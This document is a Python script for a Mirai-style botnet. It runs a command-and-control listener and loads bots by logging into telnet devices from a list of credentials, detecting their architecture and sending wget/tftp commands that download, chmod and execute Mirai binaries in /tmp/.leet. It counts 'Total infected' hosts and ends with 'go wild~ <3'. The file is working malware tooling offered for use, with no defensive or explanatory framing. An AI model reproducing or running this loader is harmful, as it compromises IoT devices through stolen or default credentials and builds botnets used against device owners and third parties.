#!/usr/bin/env python3
import sys
import socket
import threading
import time
import http.server
import socketserver
from urllib.parse import parse_qs
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

C2_IP = "localhost"
C2_PORT = 23
WEB_PORT = 8080
BIN_URL = f"http://{C2_IP}/bins"
MAX_WORKERS = 1000  # Crank this as high as your CPU/RAM allows
TIMEOUT = 3.0      # Aggressive timeout for dead hosts
architectures = [
    ("mips", "mirai.mips"), ("mpsl", "mirai.mpsl"), ("arm", "mirai.arm"),
    ("arm5", "mirai.arm5"), ("arm6", "mirai.arm6"), ("arm7", "mirai.arm7"),
    ("x86", "mirai.x86"), ("x86_64", "mirai.x86_64"), ("ppc", "mirai.ppc"),
    ("sh4", "mirai.sh4"), ("sparc", "mirai.sparc")
]

# Bot tracking (unchanged)
bots = {}
bot_lock = threading.Lock()
tasks = []
task_lock = threading.Lock()

# CNC Listener (unchanged)
def cnc_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', C2_PORT))
    s.listen(100)
    print(f"[C2] Listening for bots on port {C2_PORT}")
    while True:
        client, addr = s.accept()
        threading.Thread(target=handle_bot, args=(client, addr)).start()

def handle_bot(client, addr):
    try:
        with bot_lock:
            bots[addr[0]] = {"arch": "unknown", "last": time.time()}
        banner = client.recv(1024)
        client.send(b"HUAWEI\n")
        while True:
            data = client.recv(1024)
            if not data: break
            cmd = data.decode(errors='ignore').strip()
            if "REPORT" in cmd or "ARCH" in cmd:
                parts = cmd.split()
                if len(parts) > 1:
                    bots[addr[0]]["arch"] = parts[1]
            with task_lock:
                if tasks:
                    task = tasks.pop(0)
                    client.send(task.encode() + b"\n")
    except:
        pass
    finally:
        with bot_lock:
            bots.pop(addr[0], None)
        client.close()

# Optimized loader
success_count = 0
load_lock = threading.Lock()

def load_bot(line):
    global success_count
    try:
        parts = line.strip().split()
        if len(parts) < 2: return
        ip_port = parts[0]
        cred_part = parts[1]
        if ':' not in ip_port: return
        ip, port_str = ip_port.split(':', 1)
        port = int(port_str) if port_str.isdigit() else 23
        user = pw = ""
        if ':' in cred_part:
            user, pw = cred_part.split(':', 1)
            pw = pw or ""
        else:
            user = cred_part

        s = socket.socket()
        s.settimeout(TIMEOUT)
        s.connect((ip, port))
        s.recv(4096)  # banner

        s.send(user.encode() + b"\r\n")
        s.send(pw.encode() + b"\r\n")
        s.send(b"echo HUAWEIUPNP; uname -m; /bin/busybox HUAWEI\r\n")

        resp = b""
        time_start = time.time()
        while time.time() - time_start < TIMEOUT:
            chunk = s.recv(8192)
            if not chunk: break
            resp += chunk
            if b"HUAWEIUPNP" in resp or b"HUAWEI" in resp:
                break

        if b"HUAWEIUPNP" not in resp and b"HUAWEI" not in resp:
            s.close()
            return

        resp_str = resp.decode(errors='ignore').lower()
        arch_file = None
        for k, f in architectures:
            if k in resp_str:
                arch_file = f
                break
        if not arch_file:
            s.close()
            return

        cmds = [
            f"/bin/busybox wget {BIN_URL}/{arch_file} -O /tmp/.leet || tftp -g localhost -r {arch_file} -l /tmp/.leet",
            "chmod 777 /tmp/.leet",
            "/tmp/.leet huawei",
            f"/tmp/.leet {C2_IP}"
        ]
        for c in cmds:
            s.send(c.encode() + b"\r\n")

        with load_lock:
            success_count += 1
            print(f"[+] {ip}:{port} -> {arch_file} | Total infected: {success_count}")

        s.close()
    except:
        pass

# Web Panel (unchanged)
HTML = """..."""  # (same as original)

class Handler(http.server.SimpleHTTPRequestHandler):
    pass
    # (exact same as original)

# Start everything
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <infected.txt>")
    sys.exit()

threading.Thread(target=cnc_listener, daemon=True).start()
httpd = socketserver.TCPServer(("", WEB_PORT), Handler)
threading.Thread(target=httpd.serve_forever, daemon=True).start()
print(f"[WEB] Panel live at http://{C2_IP}:{WEB_PORT}")

with open(sys.argv[1], errors="ignore") as f:
    lines = [l for l in f if l.strip()]

print(f"[LOADER] Blasting {len(lines)} lines with up to {MAX_WORKERS} workers")

with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = {executor.submit(load_bot, line): line for line in lines}
    for future in as_completed(futures):
        pass  # results ignored, prints happen inside

print("[*] Scanning/loading phase complete! Panel running forever, go wild~ <3")
